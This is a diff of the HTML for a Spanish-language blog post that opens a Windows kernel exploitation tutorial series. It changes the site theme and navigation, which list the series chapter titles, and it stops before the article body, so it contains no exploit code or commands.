@@ -1,114 +1,955 @@
-<!doctype html>
-<html lang="en-us">
-  <head>
-    <title>0x00 - Introducción a Windows Kernel Explotación // </title>
-    <link rel="shortcut icon" href="/favicon.ico" />
-    <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.131.0">
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="author" content="John Doe" />
-    <meta name="description" content="" />
-    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
-    
-
-    
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
   
-
-
-    
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="0x00 - Introducción a Windows Kernel Explotación">
-  <meta name="twitter:description" content="Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, “no se nace aprendido”. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).
-Para empezar, baja estos programas:
-Programa de Virtualización: Esto puede ser cualquier desde VirtualBox a VMWare.">
-
-    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/">
-  <meta property="og:site_name" content="wetw0rk">
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>0x00 - Introducción a Windows Kernel Explotación &middot; Blowfish</title>
+  <meta name="title" content="0x00 - Introducción a Windows Kernel Explotación &middot; Blowfish" />
+  
+  
+  
+  
+  
+  <link rel="canonical" href="/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.1c9cd0d1ebaf117272b5c4f6bd49878475cb210d5e0da4f061632d779f5bb46851881c187e6e634dba5071c4e3d80e7d5cec1dd80443b2fa68acd358f9eda881.css"
+    integrity="sha512-HJzQ0euvEXJytcT2vUmHhHXLIQ1eDaTwYWMtd59btGhRiBwYfm5jTbpQccTj2A59XOwd2ARDsvporNNY&#43;e2ogQ==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.52b8d61b061c90a738102a0eac69eaa1479fdf5de882a0b0741d7515240617156a6c4477fcc91f9c962062804fe62d2932bb9f57d0aded208c762c2e1ed2e202.js"
+    integrity="sha512-UrjWGwYckKc4ECoOrGnqoUef313ogqCwdB11FSQGFxVqbER3/MkfnJYgYoBP5i0pMrufV9Ct7SCMdiwuHtLiAg==" data-copy="" data-copied=""></script>
+  
+  
+  
+  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/">
+  <meta property="og:site_name" content="Blowfish">
   <meta property="og:title" content="0x00 - Introducción a Windows Kernel Explotación">
-  <meta property="og:description" content="Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, “no se nace aprendido”. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).
-Para empezar, baja estos programas:
-Programa de Virtualización: Esto puede ser cualquier desde VirtualBox a VMWare.">
-  <meta property="og:locale" content="en_us">
+  <meta property="og:description" content="Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación.">
+  <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2024-12-01T00:00:00+00:00">
     <meta property="article:modified_time" content="2024-12-01T00:00:00+00:00">
 
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x00 - Introducción a Windows Kernel Explotación">
+  <meta name="twitter:description" content="Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación.">
 
-  </head>
-  <body>
-    <header class="app-header">
-      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
-      <span class="app-header-title"></span>
-      <p> </p>
-      <div class="app-header-social">
-        
-          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
-            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
-          </a>
-        
-          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
-            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
-          </a>
-        
-      </div>
-    </header>
-    <main class="app-container">
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "0x00 - Introducción a Windows Kernel Explotación",
+    "headline": "0x00 - Introducción a Windows Kernel Explotación",
+    
+    "abstract": "Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación.",
+    "inLanguage": "en",
+    "url" : "\/posts\/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n\/",
+    "author" : {
+      "@type": "Person",
+      "name": "wetw0rk"
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-12-01T00:00:00\u002b00:00",
+    "datePublished": "2024-12-01T00:00:00\u002b00:00",
+    
+    "dateModified": "2024-12-01T00:00:00\u002b00:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3514"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="wetw0rk" />
+  
+  
+  
+  <link href="https://bsky.app/profile/wetw0rk.bsky.social" rel="me" />
+  
+  
+  <link href="https://github.com/wetw0rk" rel="me" />
+  
+  
+  <link href="https://www.linkedin.com/in/milton-wetw0rk/" rel="me" />
+  
+  
+  <link href="https://x.com/wetw0rk_bot" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3">
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Blowfish</a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-base font-medium" title="">
+        Home
+    </p>
+</a>
+
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Study Cases
+    </a>
+    <span>
       
-  <article class="post">
-    <header class="post-header">
-      <h1 class ="post-title">0x00 - Introducción a Windows Kernel Explotación</h1>
-      <div class="post-meta">
-        <div>
-          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
-          Dec 1, 2024
-        </div>
-        <div>
-          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
-          17 min read
-        </div>
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/posts/ezekielswheel/ezekielswheel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            Ezekiels Wheel (Hells Gate Analysis)
+          </p>
+        </a>
+        
       </div>
-    </header>
-    <div class="post-content">
-      <p>Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, &ldquo;no se nace aprendido&rdquo;. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).</p>
+    </div>
+  </div>
+</div>
+
+
+
+            
+             
+  <div>
+  <div class="cursor-pointer flex items-center nested-menu">
+    
+    <a  class="text-base font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="">
+      Windows Kernel Exploitation Series
+    </a>
+    <span>
+      
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+    </span>
+  </div>
+  <div class="absolute menuhide">
+    <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl">
+      <div class="flex flex-col space-y-3">
+        
+        <a href="/posts/0x00-introduction-to-windows-kernel-exploitation/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x00 - Introduction To Windows-Kernel Exploitation
+          </p>
+        </a>
+        
+        <a href="/posts/0x01-killing-windows-kernel-mitigations/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x01 - Killing Windows Kernel Mitigations
+          </p>
+        </a>
+        
+        <a href="/posts/0x02-introduction-to-windows-kernel-uafs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x02 - Introduction to Windows Kernel Use After Frees
+          </p>
+        </a>
+        
+        <a href="/posts/0x03-approaching-the-modern-windows-kernel-heap/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x03 - Approaching the Modern Windows Kernel Heap
+          </p>
+        </a>
+        
+        <a href="/posts/0x04-writing-what-where-in-the-kernel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x04 - Introduction To Windows Kernel Write What Where
+          </p>
+        </a>
+        
+        <a href="/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities
+          </p>
+        </a>
+        
+        <a href="/posts/0x06-approaching-modern-windows-kernel-type-confusions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x06 - Approaching Modern Windows Kernel Type Confusions
+          </p>
+        </a>
+        
+        <a href="/posts/0x07-introduction-to-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x07 - Introduction to Windows Kernel Race Conditions
+          </p>
+        </a>
+        
+        <a href="/posts/0x08-modern-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x08 - Modern Windows Kernel Race Conditions
+          </p>
+        </a>
+        
+        <a href="/posts/0x09-return-of-the-stack-overflow/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+          
+          <p class="text-sm font-sm" title="">
+            0x09 - Return of The Stack Overflow
+          </p>
+        </a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class=" flex items-center">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+                    <div class="flex items-center justify-center dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+                <div class="flex items-center justify-center dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a href="" class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Study Cases
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/ezekielswheel/ezekielswheel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            Ezekiels Wheel (Hells Gate Analysis)
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+
+                    
+
+                     
+  <li class="mt-1">
+    <a href="" class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-bg font-bg" title="">
+            Windows Kernel Exploitation Series
+        </p>
+        <span>
+            
+
+  <span class="relative block icon">
+    <svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+
+  </span>
+
+
+        </span>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x00-introduction-to-windows-kernel-exploitation/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x00 - Introduction To Windows-Kernel Exploitation
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x01-killing-windows-kernel-mitigations/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x01 - Killing Windows Kernel Mitigations
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x02-introduction-to-windows-kernel-uafs/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x02 - Introduction to Windows Kernel Use After Frees
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x03-approaching-the-modern-windows-kernel-heap/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x03 - Approaching the Modern Windows Kernel Heap
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x04-writing-what-where-in-the-kernel/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x04 - Introduction To Windows Kernel Write What Where
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x05 - Introduction to Windows Kernel Type Confusion Vulnerabilities
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x06-approaching-modern-windows-kernel-type-confusions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x06 - Approaching Modern Windows Kernel Type Confusions
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x07-introduction-to-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x07 - Introduction to Windows Kernel Race Conditions
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x08-modern-windows-kernel-race-conditions/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x08 - Modern Windows Kernel Race Conditions
+        </p>
+    </a>
+</li>
+
+<li class="mt-1">
+    <a href="/posts/0x09-return-of-the-stack-overflow/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+        
+        <p class="text-sm font-small" title="">
+            0x09 - Return of The Stack Overflow
+        </p>
+    </a>
+</li>
+
+<li class="mb-2"></li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+<article>
+  
+
